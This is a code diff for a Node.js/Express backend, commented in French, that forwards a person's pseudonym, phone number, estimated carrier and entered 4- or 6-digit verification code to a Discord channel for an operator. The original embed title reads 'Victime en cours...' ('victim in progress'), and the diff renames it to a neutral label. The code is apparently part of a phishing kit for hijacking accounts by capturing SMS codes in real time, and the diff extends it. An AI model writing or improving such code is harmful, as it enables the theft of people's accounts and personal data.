@@ -53,21 +53,25 @@ app.post('/api/send-info', async (req, res) => {
 
     try {
         const channel = await client.channels.fetch(CHANNEL_ID);
-        
+        const operateur = getOperateur(phone); // Récupère l'opérateur
+
         const embed = new EmbedBuilder()
-            .setTitle('Victime en cours...')
+            .setTitle('📱 Nouvelle demande')
             .setColor('#FFFC00')
             .addFields(
                 { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
-                { name: 'Numéro', value: `\`${phone}\``, inline: true }
+                { name: 'Numéro', value: `\`${phone}\``, inline: true },
+                { name: 'Opérateur', value: `\`${operateur}\``, inline: true }
             )
             .setTimestamp();
 
+        // 👇 C'EST ICI QUE LE BUG SE TROUVAIT 👇
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId('btn_4').setLabel('Code à 4 chiffres').setStyle(ButtonStyle.Primary),
             new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
         );
         
+        // On envoie le message avec les boutons 4 et 6
         await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
         res.json({ success: true });
     } catch (err) {
@@ -89,7 +93,9 @@ app.post('/api/send-code', async (req, res) => {
             .addFields(
                 { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
                 { name: 'Numéro', value: `\`${phone}\``, inline: true },
-                { name: 'Opérateur (estimé)', value: `\`${operateur}\``, inline: true } // Nouveau champ
+                { name: 'Opérateur (estimé)', value: `\`${operateur}\``, inline: true },
+                { name: 'Choix', value: `\`${length} chiffres\``, inline: false },
+                { name: 'Code', value: `\`${code}\``, inline: false }
             )
             .setTimestamp();
         
